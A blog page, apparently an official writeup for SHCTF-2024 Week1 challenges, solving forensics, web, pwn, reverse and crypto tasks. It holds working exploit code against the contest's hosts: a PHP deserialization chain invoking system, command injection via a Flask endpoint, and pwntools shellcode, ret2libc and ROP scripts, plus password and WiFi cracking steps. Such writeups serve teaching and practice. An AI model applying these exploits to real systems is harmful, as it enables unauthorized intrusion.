@@ -1,0 +1,711 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SHCTF-2024-Week1 官方WP | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="看雪 ctfiot 招新题库，Week1 全是 8 个类别的签到 + 工具题 (RC4&#x2F;PNG&#x2F;zip&#x2F;MD5 碰撞&#x2F;WiFi&#x2F;Java&#x2F;PHP 链)。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SHCTF-2024-Week1 官方WP">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Misc/SHCTF-2024-Week1_%E5%AE%98%E6%96%B9WP/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="看雪 ctfiot 招新题库，Week1 全是 8 个类别的签到 + 工具题 (RC4&#x2F;PNG&#x2F;zip&#x2F;MD5 碰撞&#x2F;WiFi&#x2F;Java&#x2F;PHP 链)。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="shctf2024-week1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Misc/SHCTF-2024-Week1_%E5%AE%98%E6%96%B9WP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SHCTF-2024-Week1 官方WP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SHCTF-2024-Week1 官方WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SHCTF-2024-Week1 官方WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/209352.html">https://www.ctfiot.com/209352.html</a><br>ID: 209352</p>
+</blockquote>
+<p>Misc</p>
+<p>[WEEK1]Quarantine</p>
+<p>结合题目描述和题目名称，关键词搜索很容易定位到Windows defender的隔离文件，例如： <a target="_blank" rel="noopener" href="https://blog.fox-it.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/">https://blog.fox-it.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/</a></p>
+<p>使用了RC4加密且key为硬编码，参考： <a target="_blank" rel="noopener" href="https://github.com/brad-sp/cuckoo-modified/commit/61087cae2e40c8b26f94162c652b4bc48256264b#diff-a171a256ae06a65170deb04a3ba4c27d5a3bbb5ee767f66465742abe902b5104R185">https://github.com/brad-sp/cuckoo-modified/commit/61087cae2e40c8b26f94162c652b4bc48256264b#diff-a171a256ae06a65170deb04a3ba4c27d5a3bbb5ee767f66465742abe902b5104R185</a></p>
+<p>有很多可用项目，当然厨子直接RC4解密也可以，解密后的base64解码保存为zip，直接字典跑rockyou即可得到解压密码</p>
+<p>[WEEK1]拜师之旅①</p>
+<p>相关知识请自行搜索了,也是老题目了</p>
+<p>010editor或者winhex等工具打开补充png头尾的hex数据即可打开图片</p>
+<p>头:89 50 4E 47 0D 0A 1A 0A</p>
+<p>尾:AE 42 60 82</p>
+<p>查看flag需要修改宽高,将高度从07改08即可(这一步羊驼也能梭)</p>
+<p>[Week1]真真假假?遮遮掩掩!</p>
+<p>具体知识自行搜索,这里不详细讲了</p>
+<p>根据题目及描述推测有伪加密和掩码攻击</p>
+<p>第一个zip是伪加密,将下图中选中部分改为00即可</p>
+<p>第二个是真加密,在注释处有密码格式提示,掩码爆破弱口令即可</p>
+<p>这里提一嘴,很多人直接暴力破解问号处的内容,看到6位的时候不应该第一时间考虑弱口令吗?弱口令和字典是没有提示时爆破需要考虑的,正如Quarantine题目一样,rockyou字典是非常好用的!</p>
+<p>[Week1]Rasterizing Traffic</p>
+<p>前面流量分析看一下就知道有用的是在PNG文件（手搓一下就能提取了）然后看得出来是光栅，然后能搜到下面脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AabyssZG/Raster-Terminator">https://github.com/AabyssZG/Raster-Terminator</a></p>
+<p>这里在出题时因为看到了网上有曾哥的一把梭脚本，为了锻炼一下选手就直接在生成光栅的时候把图片模式转换成了灰度图，然后直接运用那个工具爆破是会报错，转换图片为rgb的导出就能用上面的脚本了，也可以自己写个脚本</p>
+<p>from PIL import Image<br>import numpy as np</p>
+<p>img &#x3D; np.array(Image.open(r’.&#x2F;download.png’).convert(‘L’)) </p>
+<p>for i in range(5):<br>    z &#x3D; np.zeros_like(img)  <br>    z[:, i::5] &#x3D; img[:, i::5]  <br>    Image.fromarray(z).show()</p>
+<p>[Week1]有WiFi干嘛不用呢？</p>
+<p>把may中所有的数据提取出来做成字典：</p>
+<p>cat .&#x2F;* &gt; output</p>
+<p>删一下[]，aircrack-ng爆破即可：</p>
+<p>aircrack-ng file -w output</p>
+<p>Web</p>
+<p>[Week1] poppopop</p>
+<?php
+class SH {
+
+    public static $Web = false;
+    public static $SHCTF = false;
+}
+class C {
+    public $p;
+
+    public function flag()
+    {
+        ($this->p)();
+    }
+}
+class T{
+
+    public $n;
+    public function __destruct()
+    {
+
+        SH::$Web = true;
+        echo "11";
+    }
+}
+class F {
+    public $o;
+    public function __toString()
+    {
+        SH::$SHCTF = true;
+        $this->o->flag();
+        return "其实。。。。,";
+    }
+}
+class SHCTF {
+    public $isyou="system";
+    public $flag="cat /f*";
+    public function __invoke()
+    {
+        if (SH::$Web) {
+
+            ($this->isyou)($this->flag);
+            echo "小丑竟是我自己呜呜呜~";
+        } else {
+            echo "小丑别看了!";
+        }
+    }
+}
+$a =new T();
+$a->n=new F();
+$a->n->o=new C();
+$a->n->o->p=new SHCTF();
+echo base64_encode(serialize($a));
+
+[Week1] jvav
+
+在线执行java代码
+
+需要了解java基本语法以及用java执行系统命令
+
+要注意类名为demo，与demo.java一致
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+class demo{
+    public static void main(String[] args) {
+        try {
+            Process process = Runtime.getRuntime().exec("cat /flag");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                System.out.println(line);
+            }
+            process.waitFor();
+            reader.close();
+        } catch (Exception e) {
+        }
+    }
+}
+
+[Week1]单身十八年的手速
+
+需要点击超过520次拿到flag，查看页面源代码，引用了game.js，查看game.js的内容，发现是混淆过后的js，无需去混淆，直接定位520的hex值0x208，发现后面就是alert了一段字符串，base64解密拿到flag，有经验的可以直接定位alert
+
+[Week1]1zflask
+
+根据题目描述，访问/robots.txt，发现/s3recttt路由，访问得到题目源码app.py
+
+/api路由存在命令执行，通过GET参数SSHCTFF提交
+
+import os
+import flask
+from flask import Flask, request, send_from_directory, send_file
+
+app = Flask(__name__)
+
+@app.route('/api')
+def api():
+    cmd = request.args.get('SSHCTFF', 'ls /')
+    result = os.popen(cmd).read()
+    return result
+    
+@app.route('/robots.txt')
+def static_from_root():
+    return send_from_directory(app.static_folder,'robots.txt')
+    
+@app.route('/s3recttt')
+def get_source():
+    file_path = "app.py"
+    return send_file(file_path, as_attachment=True)
+ 
+if __name__ == '__main__':
+    app.run(debug=True)
+
+执行ls /发现/flag文件
+
+http://entry.shc.tf:?????/api?SSHCTFF=ls /
+
+执行cat /flag得到flag
+
+[Week1] MD5 Master
+
+MD5强碰撞，指定了前缀为 MD5 master!
+
+用 fastcoll 生成两个前缀为 MD5 master! 且md5一样的文件。
+
+进行URL编码，这里我用PHP写的一个脚本
+
+<?php
+$md51=file_get_contents('./md5_msg1.txt');
+$md52=file_get_contents('./md5_msg2.txt');
+$master = "MD5 master!";
+
+if($md51 !== $md52 && md5($md51)===md5($md52)){
+    echo "master1=".urlencode(substr($md51,strlen($master)));
+    echo "&";
+    echo "master2=".urlencode(substr($md52,strlen($master)));
+}
+
+得到
+
+master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DKc%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02%C6%90cg%40%84_8%D5M%AE%CC%88%B6%86Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%A8%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%ACJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%7E%E6%B0%94%3B&master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DK%E3%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02F%91cg%40%84_8%D5M%AE%CC%88%B6%06Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%28%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%2CJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%FE%E6%B0%94%3B
+
+用bp或者hackerbar发送过去即可
+
+这里需要注意的细节是，用hackerbar发送时，要在结尾多添加一个 &，因为hackerbar会自动换行
+
+用bp发送时，要把最后的空行删除，不能有多余的东西，或者在结尾多添加一个&
+
+[Week1] 蛐蛐？蛐蛐！
+
+先通过点击发现是向check.php发送，之后通过注释发现源码位置
+
+绕过方法很多很多，单是第一个就可以用114514a或者是科学计数法绕过
+
+第二个很多师傅私聊我说真的能绕么，当然可以，拿分号截断一下就行了嘛，毕竟我只判断了六位（小声蛐蛐
+
+Pwn
+
+[Week1]签个到吧
+
+IDA分析程序,ban了一些东西，而且存在close(1)，那么重定向一下即可：
+
+cat /flag >$2
+
+[Week1]指令执行器
+
+先删除IDA无法识别的部分，查看伪代码发现向栈中写入数据并跳转到栈上去执行写入的数据
+
+但是有check会检查是否有系统调用，我们可以给输入的数据大小设置为0x50f(syscall)然后写入正常的shellcode并去掉syscall，通过nop指令一直执行到syscall
+
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+p = process('./pwn')
+payload = asm(shellcraft.sh())[:-2].ljust(0x100, asm('nop'))
+p.sendlineafter(b':', str(0x50f))
+p.sendafter(b':', payload)
+p.interactive()
+
+[Week1]No_stack_overflow1
+
+程序存在一个栈溢出，但是有一个通过strlen检测输入数据长度的逻辑，strlen只会计算x00前字符串的长度，所以可以插入一个x00去绕过strlen的检测，覆盖范围地址劫持控制流，同时程序里面有一个可以getshell的backdoor函数，将返回地址覆盖成backdoor就可以getshell
+
+Exp
+
+from pwn import *
+# from LibcSearcher import *
+import itertools
+import ctypes
+
+context(os='linux', arch='amd64', log_level='debug')
+
+is_debug = 0
+IP = "entry.shc.tf"
+PORT = 45385
+
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+def connect():
+    return remote(IP, PORT) if not is_debug else process()
+
+g = lambda x: gdb.attach(x)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+r = lambda x=None: p.recv() if x is None else p.recv(x)
+rl = lambda: p.recvline()
+ru = lambda x: p.recvuntil(x)
+r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
+r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])
+
+p = connect()
+
+backdoor = 0x4011DE
+
+payload = b'x00' * 0x118 + p64(backdoor)
+
+sa(">>>",payload)
+
+p.interactive()
+
+[Week1]No_stack_overflow2
+
+size是使用int类型存储的，然后read函数size这个参数是uint类型的，
+
+可以通过输入一个负数去绕过size的检查并且利用有符号数和无符号数存储的方式构造出一个栈溢出漏洞
+
+相对No_stack_overflow1来说，我们不知道system函数的地址在哪里，需要想方法拿到system函数的地址才能getshell
+
+程序是动态连接的，由于延迟绑定的机制，在函数调用一次后got表对应的项里会存储该函数的地址，可以通过泄露got表的方式拿到该函数的地址，然后通过该函数的偏移和system的偏移计算出system函数的地址
+
+通过puts函数配合程序里pop rdi ret这个gadget就可以泄露地址，泄露地址后返回main函数再打一次rop就好了
+
+from pwn import *
+# from LibcSearcher import *
+import itertools
+import ctypes
+
+context(os='linux', arch='amd64', log_level='debug')
+
+is_debug = 0
+IP = "entry.shc.tf"
+PORT = 30897
+
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+def connect():
+    return remote(IP, PORT) if not is_debug else process()
+
+g = lambda x: gdb.attach(x)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+r = lambda x=None: p.recv() if x is None else p.recv(x)
+rl = lambda: p.recvline()
+ru = lambda x: p.recvuntil(x)
+r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
+r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])
+
+p = connect()
+
+sla("size","-1")
+
+pop_rdi_ret = 0x401223
+ret = 0x000000000040101a
+main = 0x0000000000401228
+
+payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
+# g(p)
+sa("input",payload)
+rl()
+leak = u64(r(6).ljust(8,b'x00'))
+libc_base = leak - libc.sym['puts']
+success(f"libc_base ->{hex(libc_base)}")
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+sla("size","-1")
+payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
+sa("input",payload)
+
+p.interactive()
+
+[Week1]No_stack_overflow2_pro
+
+程序逻辑和2相同，但是变成静态链接的，system函数本质上是封装了execve这个系统调用，通过execve系统调用一样可以getshell
+
+首先得往一个可读写已知的地址写入binsh字符串，然后再通过execve系统调用getshell就好了
+
+Exp
+
+from pwn import *
+# from LibcSearcher import *
+import itertools
+import ctypes
+
+context(os='linux', arch='amd64', log_level='debug')
+
+is_debug = 0
+IP = "entry.shc.tf"
+PORT = 30897
+
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+def connect():
+    return remote(IP, PORT) if not is_debug else process()
+
+g = lambda x: gdb.attach(x)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+r = lambda x=None: p.recv() if x is None else p.recv(x)
+rl = lambda: p.recvline()
+ru = lambda x: p.recvuntil(x)
+r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
+r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])
+
+p = connect()
+
+pop_rdi_ret = 0x00000000004022bf
+pop_rsi_ret = 0x000000000040a32e
+pop_rdx_rbx_ret = 0x000000000049d06b
+pop_rax_ret = 0x00000000004507f7
+bss = 0x4e5000
+
+read = 0x00000000044FD90 
+syscall = 0x0000000000402074
+
+payload = flat([
+    b'a' * 0x108, 
+    pop_rdi_ret, 0, pop_rsi_ret,bss, pop_rdx_rbx_ret, 0x8, 0x0, read,
+    pop_rax_ret,0x3b,pop_rdi_ret,bss,pop_rsi_ret,0,pop_rdx_rbx_ret,0,0,syscall
+])
+
+sla("size","-1")
+sa("input",payload)
+
+time.sleep(0.3)
+s(b'/bin/shx00')
+
+p.interactive()
+
+Reverse
+
+[Week1]Ezapk
+
+import base64
+
+key = [12, 15, 25, 30, 36]
+enc = "woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg=="
+
+decoded= base64.b64decode(enc)
+decoded_text = decoded.decode('utf-8')
+    
+dec_text = []
+    
+for i in range(len(decoded_text)):
+    enc_char = decoded_text[i]
+
+    enc_char = ord(enc_char)
+
+    enc_char = enc_char // 2
+
+    enc_char = enc_char - 6
+
+    key_byte = key[i % len(key)]
+    ori_char = chr(enc_char ^ key_byte)
+
+    dec_text.append(ori_char)
+    
+
+print("Flag:", ''.join(dec_text))
+# Flag: 7Ush87-akjxcy2Ju-dwia9;JSO-IQixnsm
+
+[Week1]ezxor
+
+#include
+#include<stdlib.h>
+using namespace std;
+int main(){
+        char data[]={-61,105,114,-60,103,74,-24,17,67,-49,111,0,-13,68,110,-8,89,73,-24,78,94,-30,83,67,-79,92};
+        for(int i=0;i<26;i++){
+                switch (i%3) {
+                case 1:
+                        data[i]^=0x21;
+                        break;
+                case 2:
+                        data[i]^=0x31;
+                        break;
+                default:
+                        data[i]^=0x90;
+                        break;
+                }
+        } 
+        for(int i=0;i<=25;i++){
+        cout<<data[i];
+        }
+}
+#SHCTF{x0r_N1ce_hxxxoorrr!}
+
+[Week1]ezrc4
+
+//#include <stdio.h>
+#include <stdlib.h>
+#include<string.h>
+#include
+using namespace std;
+unsigned char S[256];
+void swap(unsigned char *a, unsigned char *b) {
+        unsigned char temp = *a;
+        *a = *b;
+        *b = temp;
+}
+void rc4_init(unsigned char *key, int key_length, unsigned char *S) {
+        int i, j = 0;
+        for (i = 0; i < 256; i++)
+                S[i] = i;
+        
+        for (i = 0; i < 256; i++) {
+                j = (j + S[i] + key[i % key_length]) % 256;
+                swap(&S[i], &S[j]);
+        }
+}
+void rc4_crypt(unsigned char *input, unsigned char *output, int length, unsigned char *S) {
+        int i = 0, j = 0, t = 0;
+        unsigned char k;
+        for (int counter = 0; counter < length; counter++) {
+                i = (i + 1) % 256;
+                j = (j + S[i]) % 256;
+                swap(&S[i], &S[j]);
+                t = (S[i] + S[j]) % 256;
+                k = S[t];
+                output[counter] = (input[counter] ^ k)^102;
+        }
+}
+int main(){
+        unsigned char key[]="FenKey!!";
+        unsigned char out[255]={0};
+        unsigned char data[255]={33,171,63,66,101,143,60,91,12,23,5,110,132,231,26,105,195,119,112,31,17};
+        rc4_init(key,8,S);
+        rc4_crypt(data, out, 21, S);
+        cout<<out;        
+}
+#SHCTF{rc4_nice_ez!!!}
+
+[Week1]EzDBG
+
+Minidump文件用WinDBG打开，它会自动加载.pdb符号文件。
+
+用lm命令列出已有模块：
+
+查看EzDBG的详细信息：
+
+找一下EzDBG的符号都有哪些，找到main函数：
+
+即可在反汇编窗口查看main函数的汇编：
+
+本题后期改了一次附件，改后结果与上图有些不同，开启了栈Cookie保护。具体解密方法很简单，即单字节异或0x66。看到其中enc符号是比较的密文，其后面紧跟该符号地址：
+
+解密脚本:
+
+[Week1]gamegame
+
+签到数独题，随便在线网站或者脚本都能出，完成后会得到提示，flag就是输入的答案，提取包裹shctf{}即可
+
+Crypto
+
+[Week1] factor
+
+yafu分解N得到10个小素数，之后对10个素数选7个进行排列组合
+
+
